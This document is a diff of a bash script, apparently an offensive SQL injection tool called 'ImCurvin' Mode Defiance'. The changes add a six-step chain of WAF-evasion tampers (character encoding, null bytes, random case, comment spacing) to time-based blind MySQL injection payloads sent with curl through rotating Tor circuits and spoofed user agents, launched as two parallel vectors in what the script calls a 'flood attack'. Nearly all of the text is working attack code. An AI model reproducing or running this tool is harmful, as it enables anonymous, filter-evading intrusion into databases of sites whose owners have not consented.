@@ -1,27 +1,26 @@
-# ImCurvin' v1.2.0
+# ImCurvin' v1.2.0 - Mode Defiance (Strict MySQL Parallel Edition)
 # Copyright 2026 Skokoo
 # Licensed under the Apache License, Version 2.0
-# Wip
-# If you found any bug here, please report to me at the issue section.
-target_url="$1"
-script_dir="$(dirname "$0")"
-ROOT_LOG_FILE="$script_dir/../targetDef.log"
 
-source "$script_dir/tamper/hungry.sh"
+target_url="$1"
+export DEFIANCE_DIR="$(cd "$(dirname "${BASH_SOURCE}")" && pwd)"
+export ROOT_LOG_FILE="$DEFIANCE_DIR/../targetDef.log"
+
+source "$DEFIANCE_DIR/tamper/hungry.sh"
 
 if [ -n "$custom_wordlist" ] && [ -f "$custom_wordlist" ]; then
-    WORDLIST_MYSQL="$custom_wordlist"
+    export WORDLIST_MYSQL="$custom_wordlist"
 else
-    WORDLIST_MYSQL="$script_dir/data/sqli_defiance.txt"
+    export WORDLIST_MYSQL="$DEFIANCE_DIR/data/sqli_defiance.txt"
 fi
 
 if [ -n "$custom_proxy" ]; then
-    TOR_CIRCUITS=("$custom_proxy")
+    export TOR_CIRCUITS=("$custom_proxy")
 else
-    TOR_CIRCUITS=(9050 9052 9054 9056 9058 9060)
+    export TOR_CIRCUITS=(9050 9052 9054 9056 9058 9060)
 fi
 
-DEFIANCE_UA=(
+export DEFIANCE_UA=(
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0"
@@ -65,12 +64,19 @@ vector_sqli_agressor_left() {
         if [ -n "$custom_proxy" ]; then local proxy_flag="-x $random_port"; else local proxy_flag="--socks5-hostname 127.0.0.1:$random_port"; fi
         local random_ua=${DEFIANCE_UA[$RANDOM % ${#DEFIANCE_UA[@]}]}
 
-        local step1=$(randomcase_engine "$default_path")
-        local defiance_tamper_path=$(apostrophenullencode_engine "$step1")
+        # === KOMBO 6 TAMPER INTEGRASI TOTAL DARI HUNGRY.SH ===
+        local t1=$(between_engine "$default_path")
+        local t2=$(charencode_engine "$t1")
+        local t3=$(apostrophenullencode_engine "$t2")
+        local t4=$(randomcase_engine "$t3")
+        local t5=$(space2comment_engine "$t4")
+        local defiance_tamper_path=$(appendnullbyte_engine "$t5")
         
-        echo -e "\e[0;33m[\e[0m!\e[0;34m+]\e[0m Vector 1 [Port:$random_port] Probing Latency on: \e[1;34m$target_url$defiance_tamper_path\e[0m"
+        local final_query="${defiance_tamper_path}${query_payload}"
         
-        local stopwatch=$(curl $proxy_flag -m 12 -A "$random_ua" -s -o /dev/null -w "%{time_total}" "$target_url$defiance_tamper_path")
+        echo -e "\e[0;33m[\e[0m!\e[0;34m+]\e[0m Vector 1 [Port:$random_port] Probing Latency on: \e[1;34m$target_url$final_query\e[0m"
+        
+        local stopwatch=$(curl $proxy_flag -m 12 -A "$random_ua" -s -o /dev/null -w "%{time_total}" "$target_url$final_query")
         
         if (( $(echo "$stopwatch > 4.0" | bc -l) )); then
             echo -e "    \e[0;31m[!+!]\e[0m Vector 1 confirmed MySQL Anomaly: ${stopwatch}s"
@@ -90,12 +96,19 @@ vector_sqli_agressor_right() {
         if [ -n "$custom_proxy" ]; then local proxy_flag="-x $random_port"; else local proxy_flag="--socks5-hostname 127.0.0.1:$random_port"; fi
         local random_ua=${DEFIANCE_UA[$RANDOM % ${#DEFIANCE_UA[@]}]}
 
-        local step1=$(randomcase_engine "$default_path")
-        local defiance_tamper_path=$(apostrophenullencode_engine "$step1")
+        # === KOMBO 6 TAMPER INTEGRASI TOTAL DARI HUNGRY.SH ===
+        local t1=$(between_engine "$default_path")
+        local t2=$(charencode_engine "$t1")
+        local t3=$(apostrophenullencode_engine "$t2")
+        local t4=$(randomcase_engine "$t3")
+        local t5=$(space2comment_engine "$t4")
+        local defiance_tamper_path=$(appendnullbyte_engine "$t5")
         
-        echo -e "\e[0;33m[\e[0m!\e[0;34m+]\e[0m Vector 2 [Port:$random_port] Probing Latency on: \e[1;34m$target_url$defiance_tamper_path\e[0m"
+        local final_query="${defiance_tamper_path}${query_payload}"
         
-        local stopwatch=$(curl $proxy_flag -m 12 -A "$random_ua" -s -o /dev/null -w "%{time_total}" "$target_url$defiance_tamper_path")
+        echo -e "\e[0;33m[\e[0m!\e[0;34m+]\e[0m Vector 2 [Port:$random_port] Probing Latency on: \e[1;34m$target_url$final_query\e[0m"
+        
+        local stopwatch=$(curl $proxy_flag -m 12 -A "$random_ua" -s -o /dev/null -w "%{time_total}" "$target_url$final_query")
         
         if (( $(echo "$stopwatch > 4.0" | bc -l) )); then
             echo -e "    \e[0;31m[!+!]\e[0m Vector 2 confirmed MySQL Anomaly: ${stopwatch}s"
@@ -105,6 +118,7 @@ vector_sqli_agressor_right() {
     done < "$WORDLIST_MYSQL"
 }
 
+# MAIN EXECUTION CONTROL
 clear
 print_defiance_logo
 
@@ -144,7 +158,7 @@ echo -e "\n\e[0;32m[\e[0m+\e[0;37m]\e[0m Double legal verification passed. Pre-S
 sleep 1
 
 echo -e "\e[0;34m[\e[0m*\e[0;37m]\e[0m Performing strict database environment verification..."
-recon_port=${TOR_CIRCUITS[0]}
+recon_port=${TOR_CIRCUITS}
 if [ -n "$custom_proxy" ]; then recon_proxy="-x $recon_port"; else recon_proxy="--socks5-hostname 127.0.0.1:$recon_port"; fi
 
 server_fingerprint=$(curl $recon_proxy -m 5 -s -I "$target_url" | grep -Ei "(Server|X-Powered-By|Set-Cookie|X-DDoS|WAF)")
@@ -159,7 +173,7 @@ else
 fi
 sleep 1
 
-echo -e "\n\e[0;34m[\e[0m*\e[0;37m]\e[0m Launching dual vector synchronized flood attack against \e[1;34m$target_url\e[0m...\n"
+echo -e "\n\e[0;34m[\e[0m*\e[0;37m]\e[0m Launching dual-vector synchronized flood attack against \e[1;34m$target_url\e[0m...\n"
 
 vector_sqli_agressor_left &
 pid_vector1=$!
@@ -172,8 +186,8 @@ wait $pid_vector1 $pid_vector2
 echo -e "\n\e[0;32m[\e[0m=\e[0;32m]\e[0m Attack sequence completed. Activating Defiance Log Analyst..."
 sleep 1
 
-if [ -f "$script_dir/validators/defval.py" ]; then
-    python "$script_dir/validators/defval.py"
+if [ -f "$DEFIANCE_DIR/validators/defval.py" ]; then
+    python "$DEFIANCE_DIR/validators/defval.py"
 else
     echo -e "\e[0;33m[\e[0m-\e[0;37m]\e[0m WARNING: validators/defval.py not found. Skipping live analysis."
 fi
